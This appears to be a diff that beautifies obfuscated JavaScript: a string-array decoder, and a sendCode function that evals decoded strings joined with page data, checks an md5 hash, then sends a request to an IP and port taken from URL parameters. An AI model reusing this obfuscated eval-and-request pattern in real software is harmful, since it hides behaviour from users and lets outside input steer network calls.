@@ -39,96 +39,73 @@ var EncryptedArray = [
   })(EncryptedArray, 0x186);
   
 
-  var otherFunction = function (index, _0x29f87c) {
-    index = index - 0x0;
-    var value = EncryptedArray[index];
-    if (otherFunction["FsYaOq"] === undefined) {
-      var _0x2b2171 = function (_0x464337) {
-        var _0x39b9a7 =
-            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
-          _0xcd7603 = String(_0x464337)["replace"](/=+$/, "");
-        var _0x2c626d = "";
-        for (
-          var _0x3a0203 = 0x0, _0xca4e7a, _0x4496c8, i = 0x0;
-          (_0x4496c8 = _0xcd7603["charAt"](i++));
-          ~_0x4496c8 &&
-          ((_0xca4e7a =
-            _0x3a0203 % 0x4 ? _0xca4e7a * 0x40 + _0x4496c8 : _0x4496c8),
-          _0x3a0203++ % 0x4)
-            ? (_0x2c626d += String["fromCharCode"](
-                0xff & (_0xca4e7a >> ((-0x2 * _0x3a0203) & 0x6)),
-              ))
-            : 0x0
-        ) {
-          _0x4496c8 = _0x39b9a7["indexOf"](_0x4496c8);
-        }
-        return _0x2c626d;
-      };
-      (otherFunction["wCRybo"] = function (_0x1d00b1) {
-        var _0x3ce597 = _0x2b2171(_0x1d00b1);
-        var _0x141d7d = [];
-        for (
-          var _0x3bffca = 0x0, _0x31d075 = _0x3ce597["length"];
-          _0x3bffca < _0x31d075;
-          _0x3bffca++
-        ) {
-          _0x141d7d +=
-            "%" +
-            ("00" + _0x3ce597["charCodeAt"](_0x3bffca)["toString"](0x10))[
-              "slice"
-            ](-0x2);
-        }
-        return decodeURIComponent(_0x141d7d);
-      }),
-        (otherFunction["jaFYdA"] = {}),
-        (otherFunction["FsYaOq"] = !![]);
-    }
-    var _0x5759bc = otherFunction["jaFYdA"][index];
-    return (
-      _0x5759bc === undefined
-        ? ((value = otherFunction["wCRybo"](value)),
-          (otherFunction["jaFYdA"][index] = value))
-        : (value = _0x5759bc),
-      value
-    );
-  };
-  
-  
-  function sendCode() {
-    if (
-      md5(eval(otherFunction("0x15") + document[otherFunction("0x13")] + "\x22")) ==
-      otherFunction("0x1c") + otherFunction("0x1") + otherFunction("0x19") + "f8"
-    ) {
-      var _0x2e1f41 =
-          otherFunction("0xf") +
-          otherFunction("0xa") +
-          otherFunction("0xe") +
-          otherFunction("0x1a") +
-          otherFunction("0x10") +
-          otherFunction("0x4") +
-          otherFunction("0x14") +
-          otherFunction("0x12") +
-          otherFunction("0x2") +
-          otherFunction("0x1b") +
-          otherFunction("0x6") +
-          otherFunction("0x8") +
-          otherFunction("0xb") +
-          otherFunction("0xd") +
-          otherFunction("0x5") +
-          otherFunction("0x7") +
-          otherFunction("0x16") +
-          otherFunction("0x3") +
-          otherFunction("0x9"),
-        _0x36f192 = new XMLHttpRequest(),
-        _0x5a0a5d =
-          otherFunction("0xc") +
-          urlParams()["ip"] +
-          ":" +
-          urlParams()[otherFunction("0x11")] +
-          "/" +
-          _0x2e1f41;
-      _0x36f192[otherFunction("0x18")](otherFunction("0x17"), _0x5a0a5d, !![]),
-        _0x36f192[otherFunction("0x0")](null);
-    }
+  /**
+ * @param {string} name
+ * @param {?} dataAndEvents
+ * @return {?}
+ */
+var otherFunction = function(name, dataAndEvents) {
+  name -= 0;
+  var ref = EncryptedArray[name];
+  if (void 0 === otherFunction.FsYaOq) {
+    /**
+     * @param {?} string
+     * @return {?}
+     */
+    var parse = function(string) {
+      var bs;
+      var buffer;
+      /** @type {string} */
+      var file = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
+      /** @type {string} */
+      var input = String(string).replace(/=+$/, "");
+      /** @type {string} */
+      var resp = "";
+      /** @type {number} */
+      var bc = 0;
+      /** @type {number} */
+      var idx = 0;
+      for (;buffer = input.charAt(idx++);~buffer && ((bs = bc % 4 ? 64 * bs + buffer : buffer, bc++ % 4) && (resp += String.fromCharCode(255 & bs >> (-2 * bc & 6))))) {
+        /** @type {number} */
+        buffer = file.indexOf(buffer);
+      }
+      return resp;
+    };
+    /**
+     * @param {?} code
+     * @return {?}
+     */
+    otherFunction.wCRybo = function(code) {
+      var c = parse(code);
+      /** @type {Array} */
+      var sign = [];
+      /** @type {number} */
+      var i = 0;
+      var cl = c.length;
+      for (;i < cl;i++) {
+        sign += "%" + ("00" + c.charCodeAt(i).toString(16)).slice(-2);
+      }
+      return decodeURIComponent(sign);
+    };
+    otherFunction.jaFYdA = {};
+    /** @type {boolean} */
+    otherFunction.FsYaOq = true;
   }
-  
+  var val = otherFunction.jaFYdA[name];
+  return void 0 === val ? (ref = otherFunction.wCRybo(ref), otherFunction.jaFYdA[name] = ref) : ref = val, ref;
+};
+/**
+ * @return {undefined}
+ */
+function sendCode() {
+  if (md5(eval(otherFunction("0x15") + document[otherFunction("0x13")] + '"')) == otherFunction("0x1c") + otherFunction("0x1") + otherFunction("0x19") + "f8") {
+    var millis = otherFunction("0xf") + otherFunction("0xa") + otherFunction("0xe") + otherFunction("0x1a") + otherFunction("0x10") + otherFunction("0x4") + otherFunction("0x14") + otherFunction("0x12") + otherFunction("0x2") + otherFunction("0x1b") + otherFunction("0x6") + otherFunction("0x8") + otherFunction("0xb") + otherFunction("0xd") + otherFunction("0x5") + otherFunction("0x7") + otherFunction("0x16") + otherFunction("0x3") + otherFunction("0x9");
+    /** @type {XMLHttpRequest} */
+    var req = new XMLHttpRequest;
+    /** @type {string} */
+    var newMillis = otherFunction("0xc") + urlParams().ip + ":" + urlParams()[otherFunction("0x11")] + "/" + millis;
+    req[otherFunction("0x18")](otherFunction("0x17"), newMillis, true);
+    req[otherFunction("0x0")](null);
+  }
+}
+;
